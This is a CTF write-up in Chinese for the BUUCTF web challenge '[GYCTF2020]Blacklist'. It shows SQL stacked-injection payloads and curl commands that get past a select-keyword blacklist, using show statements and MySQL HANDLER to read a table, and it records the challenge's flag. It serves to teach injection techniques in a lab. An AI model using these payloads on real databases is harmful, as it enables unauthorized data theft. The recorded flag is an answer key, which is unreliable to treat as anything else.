---
title: "[GYCTF2020]Blacklist"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [sql-injection, stacked-query, handler-bypass, blacklist-bypass]
vulnerability: SQL堆叠注入绕过select黑名单过滤
solved: true
flag: "flag{8f21ef60-d48e-4e58-985f-0ac99a4e09c1}"
---

# [GYCTF2020]Blacklist

## 题目概述
题目为一个简单的 SQL 注入页面，提示"Black list is so weak for you"，暗示需要绕过黑名单过滤。

## 信息收集
1. 访问页面发现有一个 `inject` 参数的输入框
2. 测试 `1'` 触发 SQL 语法错误，确认为 SQL 注入点
3. 测试 `union select` 时返回黑名单过滤规则：
   ```
   return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
   ```
   过滤了 select、union、insert、update、delete、drop 等关键字

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：SQL 堆叠注入
- **原理**：黑名单只过滤了 select 等关键字，但未禁止使用 `;` 分号执行多条语句，可以使用 MariaDB/MySQL 的 `handler` 语句绕过 select 限制读取数据
- **判断过程**：
  1. 测试 `1 and 1=1` 正常返回，说明 and 可用
  2. 测试 `union select` 被拦截，发现黑名单
  3. 尝试堆叠注入 `0';show tables;'` 成功返回表名

## 利用过程（Payload + Flag）

**步骤1：查看数据库表**
```
0';show tables;'
```
返回两个表：`FlagHere` 和 `words`

**步骤2：查看 FlagHere 表结构**
```
0';show columns from FlagHere;'
```
发现 `flag` 列（varchar(100)）

**步骤3：使用 handler 读取 flag**
```
0';handler FlagHere open;handler FlagHere read first;handler FlagHere close;'
```
返回：`flag{8f21ef60-d48e-4e58-985f-0ac99a4e09c1}`

## 复现步骤
```bash
# 1. 查看表名
curl -s "http://target/?inject=0';show tables;'"

# 2. 查看列名
curl -s "http://target/?inject=0';show columns from FlagHere;'"

# 3. 读取 flag
curl -s "http://target/?inject=0';handler FlagHere open;handler FlagHere read first;handler FlagHere close;'"
```

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SQL堆叠注入 | inject 参数 | `handler FlagHere open;handler FlagHere read first;` | MySQL handler 语句绕过 select 黑名单 |

## 知识总结（解题技巧、同类题型套路）
1. **handler 语句**：MySQL/MariaDB 特有的数据访问方式，可以逐行读取表数据，不依赖 select
   - `handler table_name open` - 打开表
   - `handler table_name read first/next/prev/last` - 读取数据
   - `handler table_name close` - 关闭表

2. **堆叠注入适用场景**：当 select/union 被过滤但分号未被过滤时，可尝试堆叠注入配合 show/handler 等语句

3. **黑名单绕过思路**：
   - 寻找功能等价的替代语句
   - handler 替代 select
   - show 替代 information_schema 查询
